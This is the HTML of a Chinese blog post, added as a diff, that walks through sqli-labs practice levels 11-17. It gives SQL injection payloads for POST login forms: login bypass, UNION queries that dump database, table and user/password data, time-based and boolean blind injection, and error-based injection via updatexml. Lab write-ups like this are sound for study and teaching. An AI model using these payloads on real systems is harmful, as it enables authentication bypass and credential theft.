@@ -1,0 +1,283 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>sqli-labs靶场11-17 | Putdownd’s Blog</title><meta name="author" content="putdown"><meta name="copyright" content="putdown"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="参考crow: https://github.com/crow821/crowsec Less-11 POST内容： uname&amp;#x3D;’ &amp;amp; passwd&amp;#x3D;1&amp;amp;submit&amp;#x3D;Submit 返回的结果显示你存在sql语法错误，证明存在注入漏洞。或这是直接..."><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "sqli-labs靶场11-17",
+  "url": "https://blog.putdown.top/archives/9fa8bfd5.html",
+  "image": "https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png",
+  "datePublished": "2022-08-09T15:19:15.000Z",
+  "dateModified": "2026-06-15T04:36:32.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "putdown",
+      "url": "https://blog.putdown.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png"><link rel="canonical" href="https://blog.putdown.top/archives/9fa8bfd5.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="code-t8FWZKLQce"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?f755324450eb55ec18bb83a2d2f2334e";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'sqli-labs靶场11-17',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont@1.1.0/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntimes.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Putdownd’s Blog" type="application/atom+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background-image: url(https://t.alcy.cc/fj);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">128</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">47</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://t.alcy.cc/fj);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Putdownd’s Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">sqli-labs靶场11-17</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">sqli-labs靶场11-17</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-09T15:19:15.000Z" title="发表于 2022-08-09 15:19:15">2022-08-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-15T04:36:32.000Z" title="更新于 2026-06-15 04:36:32">2026-06-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>参考crow: <a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/crow821/crowsec">https://github.com/crow821/crowsec</a></p>
+<h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><ol>
+<li>POST内容： uname&#x3D;’ &amp; passwd&#x3D;1&amp;submit&#x3D;Submit 返回的结果显示你存在sql语法错误，证明存在注入漏洞。或这是直接在username中填写’，password中随便写判断一下是否存在注入漏洞。</li>
+<li>直接在username中填写 admin’ or 1&#x3D;1#（此处不能使用–+，因为–+主要使用在url中，#是适用的）即：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; or 1=1 #&amp; passwd=a &amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>此时登录成功，可以验证存在注入漏洞。<br>3. 此时在password位置进行验证：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&amp;passwd=a&#x27; or 1=1# &amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>登录成功，开始构造！  </p>
+<ol start="4">
+<li>同样可以进行判断，最后得出一共有两列。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; order by 3#&amp;passwd=a &amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>或者是使用 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&amp;passwd=a&#x27; order by 2# &amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p>5. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&amp;passwd=a&#x27; union select database(),2  # &amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>查询到当前的数据库为security，或者是使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; union select database(),2  # &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>均可以查询到当前的数据库，当然也可以查询其它信息。<br>6. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; union select 1,(select schema_name from information_schema.schemata limit 1,1)  # &amp;passwd=a&amp;submit=Submit </span><br></pre></td></tr></table></figure>
+<p>可以查询到当前的第一个数据库，或者是使用命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata)  # &amp;passwd=a&amp;submit=Submit </span><br></pre></td></tr></table></figure>
+<p>可以得到所有的数据库。<br>7. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479)  # &amp;passwd=a&amp;submit=Submit </span><br></pre></td></tr></table></figure>
+<p>可以得到security数据库中的所有的表信息<br>8. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)  # &amp;passwd=a&amp;submit=Submit </span><br></pre></td></tr></table></figure>
+<p>通过users表获得里面的列值：id,username,password<br>9. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&#x27; union select 1, group_concat(concat_ws(&#x27;~&#x27;,username,password)) from security.users  # &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>此时就可以得到里面所有的数据。</p>
+<h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>以下均为POST内容：</p>
+<ol>
+<li>首先进行尝试：此时只是显示登陆失败，没有其他的回显，将’换为”</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; &amp;passwd=a&amp;submit=Submit  </span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>此时有回显，显示有报错信息，通过报错信息，我们知道如何进行构造：’)</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>此时构造成功之后，显示登陆成功。接下来的和less-11相同。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1# &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>通过order by语句得到一共有两列。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) order by 3# &amp;passwd=a&amp;submit=Submit </span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>查询到当前的数据库为security</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&amp;passwd=a&quot;) union select database(),2  # &amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>或者是使用： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&quot;) union select database(),2  # &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>均可以查询到当前的数据库，当然也可以查询其它信息。<br>6. 可以查询到当前的第一个数据库，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&quot;) union select 1,(select schema_name from information_schema.schemata limit 1,1)  # &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>或者是使用命令： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&quot;) union select 1,(select group_concat(schema_name) from information_schema.schemata)  # &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<p>  可以得到所有的数据库。<br>7. 可以得到security数据库中的所有的表信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&quot;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479)  # &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<ol start="8">
+<li>通过users表获得里面的列值：id,username,password</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&quot;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)  # &amp;passwd=a&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+<ol start="9">
+<li>此时就可以得到里面所有的数据。 0x7e代表的就是  ~</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=a&quot;) union select 1, group_concat(concat_ws(0x7e,username,password)) from security.users  # &amp;passwd=a&amp;submit=Submit </span><br></pre></td></tr></table></figure>
+<h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>以下均为POST内容：</p>
+<ol>
+<li>此时只是显示登陆成功，但是不会显示其他的信息。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin &amp;passwd=admin&amp;submit=Submit  </span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>直接通过报错信息知道了如何构造   构造：1’) or 1&#x3D;1#</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=&#x27; &amp;passwd=a&amp;submit=Submit  </span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>此时只是显示登陆成功，但是不会显示其他信息，考虑盲注。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) order by 2# &amp;passwd=admin&amp;submit=Submit  </span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>此时可以得到数据库的长度是8.</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27;) or if(length(database())=8,1,sleep(5))# &amp;passwd=admin&amp;submit=Submit </span><br></pre></td></tr></table></figure>
+<ol start="5">
+<li>使用or和left()来判断第一个字母是多少(注意的是这里不是使用and)</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=ain&#x27;) or left(database(),1)&gt;&#x27;a&#x27;#&amp;submit=Submit </span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li>通过这样一个个进行判断即可！</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=ain&#x27;) or left(database(),2)=&#x27;se&#x27;#&amp;submit=Submit </span><br></pre></td></tr></table></figure>
+<ol start="7">
+<li>或者是使用这种方法也是可以判断的。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=ain&#x27;) or left((select schema_name from information_schema.schemata limit 0,1),1)&gt;&#x27;a&#x27;#&amp;submit=Submit </span><br></pre></td></tr></table></figure>
+<p>查表，也可使用burpsuite进行辅助测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=ain&#x27;) or left((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 0,1),1)=&#x27;e&#x27;#&amp;submit=Submit  </span><br></pre></td></tr></table></figure>
+<h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. uname=admin&amp;passwd=a&quot;&amp;submit=Submit   构造：&quot; or 1=1#</span><br><span class="line">2. uname=admin&amp;passwd=a&quot; order by 10#sub&amp;mit=Submit 判断一共有多少列</span><br><span class="line">3. uname=admin&amp;passwd=a&quot; or if(length(database())=8,1,sleep(5))# #&amp;submit=Submit 使用和less-13同样的方法进行判断 </span><br><span class="line">* 注意and和or的用法</span><br></pre></td></tr></table></figure>
+<h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. uname=admin&amp;passwd=a&quot;&amp;submit=Submit    构造：1&#x27; or 1=1#   在这里判断列数没有实际意义了</span><br><span class="line">2. uname=adminadmin&amp;passwd=admiand&#x27; or if(length(database())&gt;1000,1,sleep(5))#&amp;submit=Submit通过这个来判断其长度</span><br><span class="line">3. uname=adminadmin&amp;passwd=admiand&#x27; or if(length()&gt;1000,1,sleep(5))#&amp;submit=Submit</span><br><span class="line">4. uname=adminadmin&amp;passwd=admiand&#x27; or left((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1)&gt;&#x27;a&#x27;#&amp;submit=Submit 使用和less-13相同的方法进行判断，就可以判断出当前security库的第一个表的第一个字母是否大于a</span><br><span class="line">5. uname=adminadmin&amp;passwd=admiand&#x27; or left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1)&gt;&#x27;g&#x27;#&amp;submit=Submit 通过同样的方法可以判断users表中的字段数据是否大于g</span><br><span class="line">6. uname=adminadmin&amp;passwd=admiand&#x27; or left((select username from security.users limit 0,1),1)&gt; &#x27;a&#x27;#&amp;submit=Submit通过这个来判断security.users下的username下第一个字段的第一位，在这里不能直接使用select username,password来一起查询，需要一个个进行查询</span><br></pre></td></tr></table></figure>
+<h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. uname = admin&amp;passwd=a&quot; &amp; submit=Submit    构造：1&quot;)  or 1=1#   在这里判断列数没有实际意义了,和less-15相同</span><br><span class="line">2. uname = adminadmin&amp;passwd=admiand&quot;) or if(length(database())&gt;1,1,sleep(5))#&amp;submit=Submit通过这个来判断其长度</span><br><span class="line">3. uname=adminadmin&amp;passwd=admiand&quot;) or if(length()&gt;1000,1,sleep(5))#&amp;submit=Submit</span><br><span class="line">4. uname=adminadmin&amp;passwd=admiand&quot;) or left((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1)&gt;&#x27;a&#x27;#&amp;submit=Submit 使用和less-13相同的方法进行判断，就可以判断出当前security库的第一个表的第一个字母是否大于a</span><br><span class="line">5. uname=adminadmin&amp;passwd=admiand&quot;) or left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1)&gt;&#x27;g&#x27;#&amp;submit=Submit 通过同样的方法可以判断users表中的字段数据是否大于g</span><br><span class="line">6. uname=adminadmin&amp;passwd=admiand&quot;) or left((select username from security.users limit 0,1),1)&gt; &#x27;a&#x27;#&amp;submit=Submit通过这个来判断security.users下的username下第一个字段的第一位，在这里不能直接使用select username,password来一起查询，需要一个个进行查询</span><br></pre></td></tr></table></figure>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><ul>
+<li>报错注入常用的三种注入方式(flool ,extractvalue、updatexml)</li>
+<li>floor()报错注入是利用count()、rand()、floor()、group by 这几个特定的函数结合在一起产生的注入漏洞，准确的说是floor,count,group by冲突报错。</li>
+<li>原理：updatexml()函数实际上是去更新了XML文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候它其实已经执行了那个子查询代码。</li>
+<li>extractvalue(xml_document,xpath_string)<br>第一个参数:XML_document是 String 格式，为XMIL文档对象的名称。<br>第二个参数:XPath_string (Xpath格式的字符串)。<br>作用: 从目标XML中返回包含所查询值的字符串。<br>ps: 返回结果限制在32位字符。</li>
+</ul>
+<p>报错原理：利用数据库表主键不能重复的原理，使用GROUP BY分组，产生主键冗余，导致报错。<br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值<br>而我们的注入语句为：<br>select updatexml(1,concat(0x7e,(SELECT username from security.users limit 0,1),0x7e),1);<br>其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出<br>ERROR 1105 (HY000): XPATH syntax error: ‘<del>Dumb</del>‘</p>
+<h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><p>首先我们要知道用户的名字是多少，然后才可以进行接下来的操作</p>
+<ol>
+<li>通过查询，可以得到security库下面的其中一个表名字</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=adm &#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x7e),1)#&amp;submit=Submit  </span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>同样的方法可以获得其他的数据</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=adm &#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),1)#&amp;submit=Submit </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=afafa&#x27;#&amp;submit=Submit</span><br><span class="line">select updatexml(1,concat(0x7e,(database())),1);</span><br><span class="line">select updatexml(1,concat(0x7e,(构造语句)),1);</span><br><span class="line">      构造语句:</span><br><span class="line">      查库： select schema_name from information_schema.schemata;</span><br><span class="line">      查表： select table_name from information_schema.tables where table_schema=&#x27;security&#x27;;</span><br><span class="line">      查列： select column_name from information_schema.columns where table_name=&#x27;users&#x27;;</span><br><span class="line">      查字段： select username,password from security.users;</span><br><span class="line">and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1)</span><br><span class="line">and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27;)),1)</span><br></pre></td></tr></table></figure>
+<p>select * from (select group_concat(concat_ws(‘~’,username,password)) from security.users) a</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.putdown.top">putdown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.putdown.top/archives/9fa8bfd5.html">https://blog.putdown.top/archives/9fa8bfd5.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.putdown.top" target="_blank">Putdownd’s Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="post-meta__tags" href="/tags/sql-labs/">sql-labs</a></div><div class="post-share"><div class="social-share" data-image="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script 